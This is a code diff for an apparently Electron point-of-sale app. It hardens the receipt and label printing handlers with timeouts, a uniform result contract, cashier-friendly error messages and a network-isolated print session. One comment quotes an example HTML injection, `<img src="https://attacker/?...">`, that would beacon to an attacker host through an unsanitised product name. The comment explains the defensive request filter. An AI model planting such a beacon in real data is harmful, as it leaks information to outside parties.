@@ -6,6 +6,7 @@ import {
   dialog,
   Menu,
   screen,
+  session,
   shell,
   webContents,
 } from 'electron';
@@ -83,8 +84,17 @@ ipcMain.on('restart-app', () => {
 });
 
 ipcMain.handle('get-printers', async () => {
-  if (!mainWindow) return [];
-  return await mainWindow.webContents.getPrintersAsync();
+  // Always resolves to an array. This used to return [] when there was no
+  // window but reject if getPrintersAsync() failed, so callers had to handle
+  // the same condition two different ways.
+  const win = mainWindow && !mainWindow.isDestroyed() ? mainWindow : null;
+  if (!win) return [];
+  try {
+    return await win.webContents.getPrintersAsync();
+  } catch (err) {
+    console.error('[PRINT] Could not enumerate printers:', err instanceof Error ? err.message : err);
+    return [];
+  }
 });
 
 interface ApiBridgeRequest {
@@ -161,8 +171,61 @@ ipcMain.handle('api-bridge', (_event, { method = 'GET', url, body, params, heade
   });
 });
 
-// Maps Chromium's internal print result codes to user-readable messages.
-// Source: chromium/src/printing/print_job.h PrintResult enum
+/** Every print IPC handler resolves with this shape. Never throws. */
+interface PrintResult {
+  success: boolean;
+  error?: string;
+}
+
+/**
+ * How long to wait for Chromium's print callback before giving up.
+ *
+ * The callback fires when the job is handed to the OS spooler, not when ink
+ * hits paper, so this is generous. It exists because the callback sometimes
+ * never fires at all — see printWithTimeout.
+ */
+const PRINT_TIMEOUT_MS = 30_000;
+
+/** Guard for BrowserWindow.loadURL, which can also hang on a bad payload. */
+const PRINT_LOAD_TIMEOUT_MS = 15_000;
+
+// Descriptive-string matches come FIRST because that is what Electron actually
+// passes. Verified against the pinned Electron (40.4.0) by calling print()
+// with a bad deviceName — the observed strings are:
+//   "Invalid deviceName provided"          (printer name not recognised)
+//   "No printers available on the network" (nothing installed at all)
+// Neither is of the `Error code: N` form the numeric table below was built
+// for, so that table never fired and this function used to return the raw
+// Chromium string to the cashier. It is kept only as a fallback for other or
+// older Electron builds. Re-run the probe if Electron is upgraded.
+const PRINT_ERROR_PATTERNS: { match: RegExp; message: string }[] = [
+  {
+    match: /no valid printers|no printers available|printer not found|invalid devicename/i,
+    message:
+      'Printer not found. It may be offline, renamed, or disconnected. Go to Settings → Receipt Settings to reselect your printer.',
+  },
+  {
+    match: /cancel/i,
+    message: 'Print was cancelled.',
+  },
+  {
+    match: /invalid (printer|print job) settings/i,
+    message:
+      'Invalid printer settings. Try selecting the printer again in Settings → Receipt Settings.',
+  },
+  {
+    match: /access denied|restricted|permission/i,
+    message:
+      'Printing was blocked by system permissions. Check that this user is allowed to print to the selected printer.',
+  },
+  {
+    match: /fail|error/i,
+    message: 'Print job failed. Check that the printer is on, connected, and has paper.',
+  },
+];
+
+// Legacy `Error code: N` mapping. Source: chromium/src/printing/print_job.h
+// PrintResult enum (older revisions — current Chromium uses mojom::ResultCode).
 const PRINT_ERROR_MESSAGES: Record<number, string> = {
   1: 'Print job failed. Check that the printer is turned on and has paper.',
   2: 'Invalid printer settings. Try selecting the printer again in Receipt Settings.',
@@ -172,66 +235,158 @@ const PRINT_ERROR_MESSAGES: Record<number, string> = {
   6: 'File system error during printing.',
 };
 
+/**
+ * Turns a print failure into something a cashier can act on.
+ *
+ * Never returns raw Chromium text: an unrecognised reason falls through to a
+ * generic but actionable message, and the verbatim reason goes to the log
+ * instead (see the [PRINT ERROR] lines) where support can find it.
+ */
 function describePrintError(failureReason: string | undefined | null): string {
-  if (!failureReason) return 'Unknown print error';
-  const codeMatch = String(failureReason).match(/Error code:\s*(\d+)/i);
+  if (!failureReason) {
+    return 'The printer did not report why the job failed. Check that it is on, connected, and has paper.';
+  }
+  const reason = String(failureReason);
+
+  const codeMatch = reason.match(/Error code:\s*(\d+)/i);
   if (codeMatch) {
     const code = parseInt(codeMatch[1], 10);
-    return PRINT_ERROR_MESSAGES[code] || `Print failed (code ${code})`;
+    if (PRINT_ERROR_MESSAGES[code]) return PRINT_ERROR_MESSAGES[code];
   }
-  return failureReason;
+
+  const pattern = PRINT_ERROR_PATTERNS.find((p) => p.match.test(reason));
+  if (pattern) return pattern.message;
+
+  return 'Print job failed. Check that the printer is on, connected, and has paper.';
+}
+
+/** The main window, but only if it is still usable. */
+function liveMainWindow(): BrowserWindow | null {
+  return mainWindow && !mainWindow.isDestroyed() ? mainWindow : null;
+}
+
+/**
+ * Submits a print job and GUARANTEES the returned promise settles.
+ *
+ * Chromium's print callback does not always fire — a stalled spooler or a
+ * wedged driver can swallow it entirely. Without this guard the renderer's
+ * `await invoke(...)` never resolves, and in the POS pay-and-print flow that
+ * leaves `isPaying` stuck true, disabling the Pay button until the app is
+ * restarted (the sale itself has already committed by then). Mirrors the 15s
+ * guard the api-bridge handler above already has.
+ *
+ * `print()` can also throw synchronously if the webContents was destroyed
+ * after the caller's isDestroyed() check, so that path resolves too rather
+ * than rejecting — callers rely on the {success,error} contract.
+ */
+function printWithTimeout(
+  contents: Electron.WebContents,
+  options: Electron.WebContentsPrintOptions,
+  label: string
+): Promise<PrintResult> {
+  return new Promise((resolve) => {
+    let settled = false;
+    let timer: ReturnType<typeof setTimeout> | undefined;
+
+    const settle = (result: PrintResult) => {
+      if (settled) return;
+      settled = true;
+      if (timer) clearTimeout(timer);
+      resolve(result);
+    };
+
+    timer = setTimeout(() => {
+      console.error(`[PRINT ERROR] ${label}: no response after ${PRINT_TIMEOUT_MS}ms`);
+      settle({
+        success: false,
+        error:
+          'The printer did not respond. It may be offline, out of paper, or stuck — check the printer and try again.',
+      });
+    }, PRINT_TIMEOUT_MS);
+
+    try {
+      contents.print(options, (success, failureReason) => {
+        if (success) {
+          console.log(`[PRINT SUCCESS] ${label}: job sent to printer.`);
+          settle({ success: true });
+          return;
+        }
+        const message = describePrintError(failureReason);
+        console.error(`[PRINT ERROR] ${label}: ${failureReason} → ${message}`);
+        settle({ success: false, error: message });
+      });
+    } catch (err) {
+      const message = err instanceof Error ? err.message : String(err);
+      console.error(`[PRINT ERROR] ${label}: print() threw: ${message}`);
+      settle({ success: false, error: `Could not start the print job: ${message}` });
+    }
+  });
+}
+
+/** Rejects if `promise` has not settled within `ms`. */
+function withTimeout<T>(promise: Promise<T>, ms: number, message: string): Promise<T> {
+  let timer: ReturnType<typeof setTimeout> | undefined;
+  return Promise.race([
+    promise.finally(() => {
+      if (timer) clearTimeout(timer);
+    }),
+    new Promise<never>((_, reject) => {
+      timer = setTimeout(() => reject(new Error(message)), ms);
+    }),
+  ]);
 }
 
 interface PrintManualRequest {
   printerName?: string;
 }
 
-ipcMain.handle('print-manual', async (_event, { printerName }: PrintManualRequest) => {
-  if (!mainWindow) return { success: false, error: 'App window not ready' };
-  console.log(`[PRINT] Direct Printing to: ${printerName || 'System Default'}`);
+ipcMain.handle(
+  'print-manual',
+  async (_event, { printerName }: PrintManualRequest): Promise<PrintResult> => {
+    const win = liveMainWindow();
+    if (!win) return { success: false, error: 'App window not ready' };
+    console.log(`[PRINT] Direct Printing to: ${printerName || 'System Default'}`);
 
-  // Validate printer availability before submitting the job
-  if (printerName) {
-    try {
-      const available = await mainWindow.webContents.getPrintersAsync();
-      const found = available.some((p) => p.name === printerName);
-      if (!found) {
-        const names = available.map((p) => p.name).join(', ') || 'none';
-        console.error(`[PRINT ERROR] Printer "${printerName}" not found. Available: ${names}`);
-        return {
-          success: false,
-          error: `Printer "${printerName}" is not available. Go to Settings → Receipt Settings to reselect your printer. Available printers: ${names}`,
-        };
+    // Validate printer availability before submitting the job
+    if (printerName) {
+      try {
+        const available = await win.webContents.getPrintersAsync();
+        const found = available.some((p) => p.name === printerName);
+        if (!found) {
+          const names = available.map((p) => p.name).join(', ') || 'none';
+          console.error(`[PRINT ERROR] Printer "${printerName}" not found. Available: ${names}`);
+          return {
+            success: false,
+            error: `Printer "${printerName}" is not available. Go to Settings → Receipt Settings to reselect your printer. Available printers: ${names}`,
+          };
+        }
+      } catch (err) {
+        console.warn('[PRINT] Could not validate printer list:', err instanceof Error ? err.message : err);
       }
-    } catch (err) {
-      console.warn('[PRINT] Could not validate printer list:', err instanceof Error ? err.message : err);
     }
-  }
 
-  return new Promise((resolve) => {
-    // silent: true — no OS print dialog, no interruption to the cashier flow
-    mainWindow!.webContents.print(
+    // Re-check after the await above: the window can close in that gap, and
+    // printing through a destroyed webContents would throw instead of
+    // returning the {success,error} shape callers depend on.
+    const target = liveMainWindow();
+    if (!target) {
+      return { success: false, error: 'The app window closed before printing could start.' };
+    }
+
+    return printWithTimeout(
+      target.webContents,
       {
-        silent: true,
+        silent: true, // no OS print dialog, no interruption to the cashier flow
         deviceName: printerName || undefined,
         printBackground: true,
         color: true,
         margins: { marginType: 'none' }, // CRITICAL: Disable margins to prevent clipping or shrinking
         scaleFactor: 100,
       },
-      (success, failureReason) => {
-        if (!success) {
-          const message = describePrintError(failureReason);
-          console.error(`[PRINT ERROR] ${failureReason} → ${message}`);
-          resolve({ success: false, error: message });
-        } else {
-          console.log('[PRINT SUCCESS] Direct print sent to printer.');
-          resolve({ success: true });
-        }
-      }
+      'receipt'
     );
-  });
-});
+  }
+);
 
 interface PrintHtmlContentRequest {
   html: string;
@@ -239,65 +394,123 @@ interface PrintHtmlContentRequest {
   pageSize?: { widthMicrons?: number; heightMicrons?: number };
 }
 
-ipcMain.handle('print-html-content', async (_event, { html, printerName, pageSize }: PrintHtmlContentRequest) => {
-  let printWindow: BrowserWindow | undefined;
+/**
+ * Chromium refuses to navigate to a data: URL beyond roughly 2 MB.
+ * Percent-encoding inflates markup 1.5-3x, so a large batch of inlined SVG
+ * barcodes can cross that line — which would otherwise surface as a silent
+ * blank page rather than an error. Guard below the real limit for headroom.
+ */
+const MAX_PRINT_DATA_URL_BYTES = 1_500_000;
 
-  try {
-    if (!html || typeof html !== 'string') {
-      throw new Error('Invalid printable HTML payload.');
+const PRINT_PARTITION = 'print-isolated';
+let printSessionConfigured = false;
+
+/**
+ * The print window renders HTML built from database values (product names,
+ * prices) that is never sanitised anywhere in the pipeline. Its
+ * webPreferences already block Node and enable the sandbox, so script in that
+ * page cannot reach the filesystem or IPC — but nothing stopped it reaching
+ * the *network*, so a crafted product name containing
+ * `<img src="https://attacker/?...">` would beacon out at print time.
+ *
+ * Confining the window to its own partition lets us block every non-data:
+ * request without touching the app's real session, which still needs network
+ * access for auto-update.
+ */
+function configurePrintSession(): void {
+  if (printSessionConfigured) return;
+  const printSession = session.fromPartition(PRINT_PARTITION);
+  printSession.webRequest.onBeforeRequest((details, callback) => {
+    const allowed = details.url.startsWith('data:') || details.url.startsWith('about:');
+    if (!allowed) {
+      console.warn('[PRINT] Blocked non-data request from print window:', details.url);
     }
+    callback({ cancel: !allowed });
+  });
+  printSessionConfigured = true;
+}
 
-    printWindow = new BrowserWindow({
-      show: false,
-      webPreferences: {
-        nodeIntegration: false,
-        contextIsolation: true,
-        sandbox: true,
-      },
-    });
+ipcMain.handle(
+  'print-html-content',
+  async (
+    _event,
+    { html, printerName, pageSize }: PrintHtmlContentRequest
+  ): Promise<PrintResult> => {
+    let printWindow: BrowserWindow | undefined;
 
-    const htmlUrl = `data:text/html;charset=utf-8,${encodeURIComponent(html)}`;
-    // loadURL resolves after dom-ready; one rAF-equivalent tick lets Chromium
-    // finish painting SVG barcodes before the print job is submitted.
-    await printWindow.loadURL(htmlUrl);
-    await new Promise((resolve) => setTimeout(resolve, 50));
+    try {
+      if (!html || typeof html !== 'string') {
+        return { success: false, error: 'Invalid printable HTML payload.' };
+      }
 
-    const printOptions: Electron.WebContentsPrintOptions & { pageSize?: { width: number; height: number } } = {
-      silent: true,
-      deviceName: printerName || undefined,
-      printBackground: true,
-      color: true,
-      margins: { marginType: 'none' },
-      scaleFactor: 100,
-    };
+      const htmlUrl = `data:text/html;charset=utf-8,${encodeURIComponent(html)}`;
+      if (Buffer.byteLength(htmlUrl) > MAX_PRINT_DATA_URL_BYTES) {
+        console.error(`[PRINT] Payload too large: ${Buffer.byteLength(htmlUrl)} bytes`);
+        return {
+          success: false,
+          error:
+            'Too much content to print in one job. Select fewer items and print in smaller batches.',
+        };
+      }
 
-    if (pageSize && Number(pageSize.widthMicrons) > 0 && Number(pageSize.heightMicrons) > 0) {
-      printOptions.pageSize = {
-        width: Math.round(Number(pageSize.widthMicrons)),
-        height: Math.round(Number(pageSize.heightMicrons)),
-      };
-    }
-
-    const result = await new Promise<{ success: boolean; failureReason?: string }>((resolve) => {
-      printWindow!.webContents.print(printOptions, (success, failureReason) => {
-        resolve({ success, failureReason });
+      configurePrintSession();
+      printWindow = new BrowserWindow({
+        show: false,
+        webPreferences: {
+          nodeIntegration: false,
+          contextIsolation: true,
+          sandbox: true,
+          partition: PRINT_PARTITION,
+        },
       });
-    });
+      printWindow.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
 
-    if (!result.success) {
-      throw new Error(describePrintError(result.failureReason));
-    }
+      // loadURL resolves after dom-ready; one rAF-equivalent tick lets Chromium
+      // finish painting SVG barcodes before the print job is submitted.
+      await withTimeout(
+        printWindow.loadURL(htmlUrl),
+        PRINT_LOAD_TIMEOUT_MS,
+        'Preparing the print preview timed out.'
+      );
+      await new Promise((resolve) => setTimeout(resolve, 50));
 
-    return { success: true };
-  } catch (error) {
-    console.error('[PRINT HTML ERROR] Failed to print HTML content:', error);
-    throw error;
-  } finally {
-    if (printWindow && !printWindow.isDestroyed()) {
-      printWindow.close();
+      if (printWindow.isDestroyed()) {
+        return { success: false, error: 'The print preview closed before printing could start.' };
+      }
+
+      const printOptions: Electron.WebContentsPrintOptions & { pageSize?: { width: number; height: number } } = {
+        silent: true,
+        deviceName: printerName || undefined,
+        printBackground: true,
+        color: true,
+        margins: { marginType: 'none' },
+        scaleFactor: 100,
+      };
+
+      if (pageSize && Number(pageSize.widthMicrons) > 0 && Number(pageSize.heightMicrons) > 0) {
+        printOptions.pageSize = {
+          width: Math.round(Number(pageSize.widthMicrons)),
+          height: Math.round(Number(pageSize.heightMicrons)),
+        };
+      }
+
+      return await printWithTimeout(printWindow.webContents, printOptions, 'labels');
+    } catch (error) {
+      // Returns rather than rethrows: this handler used to throw on failure
+      // while print-manual returned {success,error}, so callers had to guess
+      // which idiom applied. Both now share one contract.
+      const message = error instanceof Error ? error.message : String(error);
+      console.error('[PRINT HTML ERROR] Failed to print HTML content:', error);
+      return { success: false, error: message };
+    } finally {
+      // Reachable on every path now that printWithTimeout always settles —
+      // previously a swallowed print callback leaked this window permanently.
+      if (printWindow && !printWindow.isDestroyed()) {
+        printWindow.close();
+      }
     }
   }
-});
+);
 
 // -------------------------------------------------------------------------
 // CRITICAL: INITIALIZATION ORDER
